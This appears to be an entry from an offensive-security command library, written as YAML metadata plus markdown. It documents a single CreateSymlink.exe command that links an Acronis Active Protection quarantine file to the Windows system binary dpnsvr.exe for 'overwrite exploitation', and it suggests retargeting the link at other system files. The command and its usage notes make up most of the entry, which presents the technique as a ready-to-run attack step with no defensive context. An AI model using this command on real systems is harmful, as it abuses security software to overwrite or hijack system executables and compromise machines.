---
data: >-
  CreateSymlink.exe "C:\Acronis Active Protection
  Storage\Quarantine\ProgramData\ransomware_sim.exe"
  "C:\Windows\SysWOW64\dpnsvr.exe"
tags:
  - symlink
  - exploit
type: command
output: Symlink created successfully.
executor: cmd
platforms:
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:51.579Z'
id: 26c642a9-49a8-489d-9658-f56fcc1618ae
verified: false
validated: true
submitted: true
---
# create-symlink-quarantine

## Command

```cmd
CreateSymlink.exe "C:\Acronis Active Protection Storage\Quarantine\ProgramData\ransomware_sim.exe" "C:\Windows\SysWOW64\dpnsvr.exe"
```

## Description

Creates a symbolic link from the quarantine path to a system executable for overwrite exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Source | Quarantine path for link | Yes |
| Target | System file to point to | Yes |

## Examples

### Basic Usage

```cmd
CreateSymlink.exe "C:\Acronis Active Protection Storage\Quarantine\ProgramData\ransomware_sim.exe" "C:\Windows\SysWOW64\dpnsvr.exe"
```

### Advanced Usage

Change target to other system files.

## Expected Output

Symlink established; no errors.

## Related

- [[procedures/Create-Symlink-in-Quarantine-for-Overwrite]]
